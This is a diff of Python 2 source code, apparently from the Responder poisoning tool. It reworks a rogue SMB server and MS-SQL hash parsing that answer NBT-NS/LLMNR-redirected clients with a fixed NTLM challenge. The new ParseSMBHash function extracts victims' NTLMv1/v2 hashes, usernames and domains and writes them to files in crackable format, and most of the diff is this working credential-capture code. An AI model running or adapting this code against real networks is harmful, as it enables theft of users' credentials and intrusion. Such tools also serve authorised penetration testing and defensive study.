@@ -16,17 +16,15 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint
+import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random
 from Fingerprint import RunSmbFinger,OsNameClientVersion
-from base64 import b64decode,b64encode
 from odict import OrderedDict
 from socket import inet_aton
+from random import randrange
 
-parser = optparse.OptionParser(usage='python %prog -d PDC01 -i 10.20.30.40 -b 1 -s On -r 0',
+parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -b 1 -s On -r 0',
                                prog=sys.argv[0],
                                )
-parser.add_option('-d','--domain', action="store", dest="DomainName", help = "The target domain name, if not set, this tool will use WORKGROUP by default", metavar="PDC01", default="WORKGROUP")
-
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
 
 parser.add_option('-b', '--basic',action="store", help="Set this to 1 if you want to return a Basic HTTP authentication. 0 will return an NTLM authentication.This option is mandatory.", metavar="0",dest="Basic", choices=['0','1'], default="0")
@@ -64,7 +62,6 @@ logging.basicConfig(filename=str(options.sessionLog),level=logging.INFO,format='
 logging.warning('Responder Started')
 
 # Set some vars.
-DomainName = options.DomainName
 OURIP = options.OURIP
 Basic = options.Basic
 On_Off = options.on_off.upper()
@@ -80,8 +77,6 @@ def Show_Help(ExtraHelpData):
    help+= ExtraHelpData
    print help
 
-Show_Help("[+]NBT-NS & LLMNR answerer started\n")
-
 #Function used to write captured hashs to a file.
 def WriteData(outfile,data):
     with open(outfile,"w") as outf:
@@ -93,6 +88,8 @@ def WriteData(outfile,data):
 Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
+
+Show_Help("[+]NBT-NS & LLMNR answerer started\nGlobal Parameters set:\nChallenge set is: %s\nHTTP Server is:%s\nSMB Server is:%s\nSQL Server is:%s\nFingerPrint Module is:%s"%(NumChal,On_Off,SMB_On_Off,SQL_On_Off,Finger_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -186,172 +183,10 @@ class NB(SocketServer.BaseRequestHandler):
                     pass
 
 ##################################################################################
-#SMB Stuff
+#SMB Server
 ##################################################################################
+from SMBPackets import *
 
-#Calculate total SMB packet len.
-def longueur(payload):
-    length = struct.pack(">i", len(''.join(payload)))
-    return length
-
-#Set MID SMB Header field.
-def midcalc(data):
-    pack=data[34:36]
-    return pack
-
-#Set UID SMB Header field.
-def uidcalc(data):
-    pack=data[32:34]
-    return pack
-
-#Set PID SMB Header field.
-def pidcalc(data):
-    pack=data[30:32]
-    return pack
-
-#Set TID SMB Header field.
-def tidcalc(data):
-    pack=data[28:30]
-    return pack
-
-#SMB Header answer packet.
-class SMBHeader(Packet):
-    fields = OrderedDict([
-        ("proto", "\xff\x53\x4d\x42"),
-        ("cmd", "\x72"),
-        ("errorcode", "\x00\x00\x00\x00" ),
-        ("flag1", "\x80"),
-        ("flag2", "\x00\x00"),
-        ("pidhigh", "\x00\x00"),
-        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
-        ("reserved", "\x00\x00"),
-        ("tid", "\x00\x00"),
-        ("pid", "\xff\xfe"),
-        ("uid", "\x00\x00"),
-        ("mid", "\x00\x00"),
-    ])
-
-#SMB Negotiate Answer packet.
-class SMBNegoAns(Packet):
-    fields = OrderedDict([
-        ("Wordcount",    "\x11"),
-        ("Dialect",      ""),
-        ("Securitymode", "\x03"),
-        ("MaxMpx",       "\x32\x00"),
-        ("MaxVc",        "\x01\x00"),
-        ("Maxbuffsize",  "\x04\x41\x00\x00"),
-        ("Maxrawbuff",   "\x00\x00\x01\x00"),
-        ("Sessionkey",   "\x00\x00\x00\x00"),
-        ("Capabilities", "\xfc\x3e\x01\x00"),
-        ("Systemtime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
-        ("Srvtimezone",  "\x2c\x01"),
-        ("Keylength",    "\x08"),
-        ("Bcc",          "\x10\x00"),
-        ("Key",          "\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d"),
-        ("Domain",       "SMB"),
-        ("DomainNull",   "\x00\x00"),
-        ("Server",       "SMB-TOOLKIT"),
-        ("ServerNull",   "\x00\x00"),
-    ])
-
-    def calculate(self):
-        ##Convert first..
-        self.fields["Domain"] = self.fields["Domain"].encode('utf-16le')
-        self.fields["Server"] = self.fields["Server"].encode('utf-16le')
-        ##Then calculate.
-        CompleteBCCLen =  str(self.fields["Key"])+str(self.fields["Domain"])+str(self.fields["DomainNull"])+str(self.fields["Server"])+str(self.fields["ServerNull"])
-        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
-        self.fields["Keylength"] = struct.pack("<h",len(self.fields["Key"]))[0]
-
-# SMB Session/Tree Answer.
-class SMBSessTreeAns(Packet):
-    fields = OrderedDict([
-        ("Wordcount",       "\x03"),
-        ("Command",         "\x75"), 
-        ("Reserved",        "\x00"),
-        ("AndXoffset",      "\x4e\x00"),
-        ("Action",          "\x01\x00"),
-        ("Bcc",             "\x25\x00"),
-        ("NativeOs",        "Windows 5.1"),
-        ("NativeOsNull",    "\x00"),
-        ("NativeLan",       "Windows 2000 LAN Manager"),
-        ("NativeLanNull",   "\x00"),
-        ("WordcountTree",   "\x03"),
-        ("AndXCommand",     "\xff"),
-        ("Reserved1",       "\x00"),
-        ("AndxOffset",      "\x00\x00"),
-        ("OptionalSupport", "\x01\x00"),
-        ("Bcc2",            "\x08\x00"),
-        ("Service",         "A:"),
-        ("ServiceNull",     "\x00"),
-        ("FileSystem",      "NTFS"),
-        ("FileSystemNull",  "\x00"),
-
-    ])
-
-    def calculate(self):
-        ##AndxOffset
-        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["Command"])+str(self.fields["Reserved"])+str(self.fields["AndXoffset"])+str(self.fields["Action"])+str(self.fields["Bcc"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
-
-        self.fields["AndXoffset"] = struct.pack("<i", len(CalculateCompletePacket)+32)[:2]#SMB Header is *always* 32.
-        ##BCC 1 and 2
-        CompleteBCCLen =  str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
-        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
-        CompleteBCC2Len = str(self.fields["Service"])+str(self.fields["ServiceNull"])+str(self.fields["FileSystem"])+str(self.fields["FileSystemNull"])
-        self.fields["Bcc2"] = struct.pack("<h",len(CompleteBCC2Len))
-
-#Empty SMB Session packet, used when we return INVALID_LOGON.
-class SMBSessEmpty(Packet):
-    fields = OrderedDict([
-        ("Empty",       "\x00\x00\x00"),
-    ])
-
-#Function used to parse SMB NTLMv1/v2 
-def ParseHash(data,client):
-  try:
-    lenght = struct.unpack('<H',data[43:45])[0]
-    LMhashLen = struct.unpack('<H',data[51:53])[0]
-    NthashLen = struct.unpack('<H',data[53:55])[0]
-    Bcc = struct.unpack('<H',data[63:65])[0]
-    if NthashLen > 60:
-       Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
-       logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
-       print "[+]SMB-NTLMv2 hash captured from :",client
-       outfile = "SMB-NTLMv2-Client-"+client+".txt"
-       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
-       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
-       Username, Domain = tuple(var)
-       Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
-       WriteData(outfile,Writehash)
-       print "[+]SMB-NTLMv2 complete hash is :",Writehash
-       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
-       print "Username : ",Username
-       logging.warning('[+]SMB-NTLMv2 Username:%s'%(Username))
-       print "Domain (if joined, if not then computer name) : ",Domain
-       logging.warning('[+]SMB-NTLMv2 Domain (if joined, if not then computer name) :%s'%(Domain))
-    if NthashLen == 24:
-       print "[+]SMB-NTLMv1 hash captured from : ",client
-       logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
-       outfile = "SMB-NTLMv1-Client-"+client+".txt"
-       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
-       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
-       Username, Domain = tuple(var)
-       writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
-       WriteData(outfile,writehash)
-       print "[+]SMB complete hash is :", writehash
-       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
-       print "Username : ",Username
-       logging.warning('[+]SMB-NTLMv1 Username:%s'%(Username))
-       print "Domain (if joined, if not then computer name) : ",Domain
-       logging.warning('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
-    packet = data[:]
-    a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
-    if a:
-       quote = "Share requested: "+a.group(0)
-       print quote.replace('\x00','')
-       logging.warning(quote.replace('\x00',''))
-  except Exception:
-           raise
 
 #Detect if SMB auth was Anonymous
 def Is_Anonymous(data):
@@ -391,19 +226,80 @@ def Parse_Nego_Dialect(data):
     if test[10] == "NT LM 0.12":
        return "\x0a\x00"
 
+def ParseShare(data):
+    packet = data[:]
+    a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
+    if a:
+       quote = "Share requested: "+a.group(0)
+       print quote.replace('\x00','')
+       logging.warning(quote.replace('\x00',''))
+
+def ParseSMBHash(data,client):
+    SecBlobLen = struct.unpack('<H',data[51:53])[0]
+    BccLen = struct.unpack('<H',data[61:63])[0]
+    if SecBlobLen < 220:
+       SSPIStart = data[75:]
+       LMhashLen = struct.unpack('<H',data[89:91])[0]
+       LMhashOffset = struct.unpack('<H',data[91:93])[0]
+       LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+       NthashLen = struct.unpack('<H',data[97:99])[0]
+       NthashOffset = struct.unpack('<H',data[99:101])[0]
+
+    if SecBlobLen > 220:
+       SSPIStart = data[79:]#LenOfLen set for ASN...
+       LMhashLen = struct.unpack('<H',data[93:95])[0]
+       LMhashOffset = struct.unpack('<H',data[95:97])[0]
+       LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+       NthashLen = struct.unpack('<H',data[101:103])[0]
+       NthashOffset = struct.unpack('<H',data[103:105])[0]
+
+    if NthashLen == 24:
+       print "[+]SMB-NTLMv1 hash captured from : ",client
+       outfile = "SMB-NTLMv1-Client-"+client+".txt"
+       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+       DomainLen = struct.unpack('<H',data[105:107])[0]
+       DomainOffset = struct.unpack('<H',data[107:109])[0]
+       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
+       print "Domain is :", Domain
+       UserLen = struct.unpack('<H',data[113:115])[0]
+       UserOffset = struct.unpack('<H',data[115:117])[0]
+       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
+       WriteData(outfile,writehash)
+       print "[+]SMB complete hash is :", writehash
+       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
+
+    if NthashLen > 60:
+       print "[+]SMB-NTLMv2 hash captured from : ",client
+       outfile = "SMB-NTLMv2-Client-"+client+".txt"
+       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+       DomainLen = struct.unpack('<H',data[109:111])[0]
+       DomainOffset = struct.unpack('<H',data[111:113])[0]
+       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
+       print "Domain is :", Domain
+       UserLen = struct.unpack('<H',data[117:119])[0]
+       UserOffset = struct.unpack('<H',data[119:121])[0]
+       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
+       WriteData(outfile,writehash)
+       print "[+]SMB complete hash is :", writehash
+       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))
+
 #SMB Server class.
 class SMB1(SocketServer.BaseRequestHandler):
     def server_bind(self):
        self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
        self.socket.bind(self.server_address)
        self.socket.setblocking(0)
-       self.socket.setdefaulttimeout(1)
+       self.socket.setdefaulttimeout(2)
 
     def handle(self):
         try:
            while True:
               data = self.request.recv(1024)
-              self.request.settimeout(0.1)
+              self.request.settimeout(2)
               ##session request 139
               if data[0] == "\x81":
                 buffer0 = "\x82\x00\x00\x00"         
@@ -412,174 +308,91 @@ class SMB1(SocketServer.BaseRequestHandler):
              ##Negotiate proto answer.
               if data[8:10] == "\x72\x00":
                 # Customize SMB answer.
-                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-                t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Domain=DomainName,Key=Challenge)
+                head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
+                t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data))
+                t.calculate()
+                final = t 
+                packet0 = str(head)+str(final)
+                buffer0 = longueur(packet0)+packet0  
+                self.request.send(buffer0)
+                data = self.request.recv(1024)
+                ##Session Setup AndX Request
+              if data[8:10] == "\x73\x00":
+                if Is_Anonymous(data):
+                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))
+                   final = SMBSessEmpty()###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
+                   packet1 = str(head)+str(final)
+                   buffer1 = longueur(packet1)+packet1  
+                   self.request.send(buffer1)
+                else:
+                   head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
+                   t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
+                   t.calculate()
+                   final = t 
+                   packet1 = str(head)+str(final)
+                   buffer1 = longueur(packet1)+packet1  
+                   self.request.send(buffer1)
+                   data = self.request.recv(4096)
+                   if data[8:10] == "\x73\x00":
+                      ParseSMBHash(data,self.client_address[0])
+                      head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                      final = SMBSession2Accept()
+                      final.calculate()
+                      packet2 = str(head)+str(final)
+                      buffer2 = longueur(packet2)+packet2  
+                      self.request.send(buffer2)
+                      data = self.request.recv(1024)
+             ##Tree Connect IPC Answer
+              if data[8:10] == "\x75\x00":
+                ParseShare(data)
+                head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", tid="\x00\x00", uid=uidcalc(data), mid=midcalc(data))
+                t = SMBTreeData()
                 t.calculate()
                 final = t 
                 packet1 = str(head)+str(final)
                 buffer1 = longueur(packet1)+packet1  
                 self.request.send(buffer1)
                 data = self.request.recv(1024)
-                ##Session Setup AndX Request
-              if data[8:10] == "\x73\x00":
-                if Is_Anonymous(data):
-                   head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-                   final = SMBSessEmpty()
-                   packet1 = str(head)+str(final)
-                   buffer1 = longueur(packet1)+packet1  
-                   self.request.send(buffer1)
-                else:
-                   ParseHash(data,self.client_address[0])
-                   head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-                   t = SMBSessTreeAns()
-                   t.calculate()
-                   final = t 
-                   packet1 = str(head)+str(final)
-                   buffer1 = longueur(packet1)+packet1  
-                   self.request.send(buffer1)
-                   data = self.request.recv(1024)
+             ##Tree Disconnect.
+              if data[8:10] == "\x71\x00":
+                head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                final = "\x00\x00\x00" 
+                packet1 = str(head)+str(final)
+                buffer1 = longueur(packet1)+packet1  
+                self.request.send(buffer1)
+                data = self.request.recv(1024)
+             ##NT_CREATE Access Denied.
+              if data[8:10] == "\xa2\x00":
+                head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                final = "\x00\x00\x00" 
+                packet1 = str(head)+str(final)
+                buffer1 = longueur(packet1)+packet1  
+                self.request.send(buffer1)
+                data = self.request.recv(1024)
+             ##Trans2 Access Denied.
+              if data[8:10] == "\x25\x00":
+                head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                final = "\x00\x00\x00" 
+                packet1 = str(head)+str(final)
+                buffer1 = longueur(packet1)+packet1  
+                self.request.send(buffer1)
+                data = self.request.recv(1024)
+             ##LogOff.
+              if data[8:10] == "\x74\x00":
+                head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+                final = "\x02\xff\x00\x27\x00\x00\x00" 
+                packet1 = str(head)+str(final)
+                buffer1 = longueur(packet1)+packet1  
+                self.request.send(buffer1)
+                data = self.request.recv(1024)
 
         except Exception:
            pass #no need to print errors..
-           self.request.close()
 
 ##################################################################################
 #SQL Stuff
 ##################################################################################
-
-#MS-SQL Pre-login packet class
-class MSSQLPreLoginAnswer(Packet):
-    fields = OrderedDict([
-        ("PacketType",       "\x04"),
-        ("Status",           "\x01"), 
-        ("Len",              "\x00\x25"),
-        ("SPID",             "\x00\x00"),
-        ("PacketID",         "\x01"),
-        ("Window",           "\x00"),
-        ("TokenType",        "\x00"),
-        ("VersionOffset",    "\x00\x15"),
-        ("VersionLen",       "\x00\x06"),
-        ("TokenType1",       "\x01"),
-        ("EncryptionOffset", "\x00\x1b"),
-        ("EncryptionLen",    "\x00\x01"),
-        ("TokenType2",       "\x02"),
-        ("InstOptOffset",    "\x00\x1c"),
-        ("InstOptLen",       "\x00\x01"),
-        ("TokenTypeThrdID",  "\x03"),
-        ("ThrdIDOffset",     "\x00\x1d"),
-        ("ThrdIDLen",        "\x00\x00"),
-        ("ThrdIDTerminator", "\xff"),
-        ("VersionStr",       "\x09\x00\x0f\xc3"),
-        ("SubBuild",         "\x00\x00"),
-        ("EncryptionStr",    "\x02"),
-        ("InstOptStr",       "\x00"),
-        ]) 
-
-    def calculate(self):
-        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])+str(self.fields["EncryptionStr"])+str(self.fields["InstOptStr"])
-
-        VersionOffset = str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])
-
-        EncryptionOffset = VersionOffset+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])
-
-        InstOpOffset = EncryptionOffset+str(self.fields["EncryptionStr"])
-         
-        ThrdIDOffset = InstOpOffset+str(self.fields["InstOptStr"])
-
-        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
-        #Version
-        self.fields["VersionLen"] = struct.pack(">h",len(self.fields["VersionStr"]+self.fields["SubBuild"]))
-        self.fields["VersionOffset"] = struct.pack(">h",len(VersionOffset))
-        #Encryption
-        self.fields["EncryptionLen"] = struct.pack(">h",len(self.fields["EncryptionStr"]))
-        self.fields["EncryptionOffset"] = struct.pack(">h",len(EncryptionOffset))
-        #InstOpt
-        self.fields["InstOptLen"] = struct.pack(">h",len(self.fields["InstOptStr"]))
-        self.fields["EncryptionOffset"] = struct.pack(">h",len(InstOpOffset))
-        #ThrdIDOffset
-        self.fields["ThrdIDOffset"] = struct.pack(">h",len(ThrdIDOffset))
-
-#MS-SQL NTLM Negotiate packet class
-class MSSQLNTLMChallengeAnswer(Packet):
-    fields = OrderedDict([
-        ("PacketType",       "\x04"), 
-        ("Status",           "\x01"),
-        ("Len",              "\x00\xc7"),
-        ("SPID",             "\x00\x00"),
-        ("PacketID",         "\x01"),
-        ("Window",           "\x00"),
-        ("TokenType",        "\xed"),
-        ("SSPIBuffLen",      "\xbc\x00"),
-        ("Signature",        "NTLMSSP"),
-        ("SignatureNull",    "\x00"),
-        ("MessageType",      "\x02\x00\x00\x00"),
-        ("TargetNameLen",    "\x06\x00"),
-        ("TargetNameMaxLen", "\x06\x00"),
-        ("TargetNameOffset", "\x38\x00\x00\x00"),
-        ("NegoFlags",        "\x05\x02\x89\xa2"),
-        ("ServerChallenge",  Challenge),
-        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
-        ("TargetInfoLen",    "\x7e\x00"),
-        ("TargetInfoMaxLen", "\x7e\x00"),
-        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
-        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
-        ("TargetNameStr",    "SMB"),
-        ("Av1",              "\x02\x00"),#nbt name
-        ("Av1Len",           "\x06\x00"),
-        ("Av1Str",           "SMB"),
-        ("Av2",              "\x01\x00"),#Server name
-        ("Av2Len",           "\x14\x00"),
-        ("Av2Str",           "SMB-TOOLKIT"),
-        ("Av3",              "\x04\x00"),#Full Domain name
-        ("Av3Len",           "\x12\x00"),
-        ("Av3Str",           "smb.local"),
-        ("Av4",              "\x03\x00"),#Full machine domain name
-        ("Av4Len",           "\x28\x00"),
-        ("Av4Str",           "server2003.smb.local"),
-        ("Av5",              "\x05\x00"),#Domain Forest Name
-        ("Av5Len",           "\x12\x00"),
-        ("Av5Str",           "smb.local"),
-        ("Av6",              "\x00\x00"),#AvPairs Terminator
-        ("Av6Len",           "\x00\x00"),
-        ]) 
-
-    def calculate(self):
-        ##First convert to uni
-        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
-        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
-        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
-        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
-        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
-        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
-        ##Then calculate
-
-        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["SSPIBuffLen"])+str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
-
-        CalculateSSPI = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
-
-        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])
-
-        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])
-
-        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
-
-        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
-        self.fields["SSPIBuffLen"] = struct.pack("<i",len(CalculateSSPI))[:2]
-        # Target Name Offsets
-        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
-        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
-        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
-        #AvPairs Offsets
-        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
-        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
-        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
-        #AvPairs StrLen
-        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
-        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
-        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
-        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
-        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]
-        #AvPairs 6 len is always 00.
+from SQLPackets import *
 
 #This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
 def ParseSQLHash(data,client):
@@ -616,12 +429,12 @@ def ParseSQLHash(data,client):
        Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
        DomainOffset = struct.unpack('<H',data[40:42])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
-       print "[+]MSSQL NTLMv2 Domain is :", Domain
+       print "Domain is :", Domain
        logging.warning('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
        UserLen = struct.unpack('<H',data[44:46])[0]
        UserOffset = struct.unpack('<H',data[48:50])[0]
